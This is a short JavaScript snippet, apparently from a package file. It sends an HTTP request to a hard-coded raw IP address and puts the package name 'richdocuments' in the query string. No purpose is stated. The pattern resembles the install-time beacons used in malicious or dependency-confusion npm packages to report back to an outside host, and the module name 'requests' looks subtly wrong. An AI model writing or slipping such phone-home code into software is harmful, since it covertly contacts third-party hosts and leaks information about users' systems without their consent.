const request = require("requests")

let host = "128.199.122.145"
let packages = "richdocuments"

request(`http://${host}/?${packages}`, (error, response, body) => {})